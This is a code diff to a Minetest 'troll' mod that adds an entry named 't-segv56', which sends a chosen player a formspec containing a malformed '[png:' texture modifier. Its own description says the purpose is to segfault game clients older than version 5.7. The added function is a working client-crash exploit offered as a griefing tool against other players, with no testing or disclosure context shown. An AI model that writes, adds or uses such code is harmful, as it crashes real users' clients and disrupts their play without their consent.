@@ -348,3 +348,15 @@ register_troll("t-blackparticles", {
 		minetest.add_particlespawner(troll_particlespawner(1, pos, "troll_black.png", params))
 	end
 })
+
+register_troll("t-segv56", {
+	description = "Segfault a <5.7 client using a malformed texture modifier",
+	func = function(_, params)
+		local player = minetest.get_player_by_name(params)
+		if not player then
+			return
+		end
+
+		minetest.show_formspec(params,"skull_emoji","image[0,0;0,0;\\[png:]")
+	end
+})
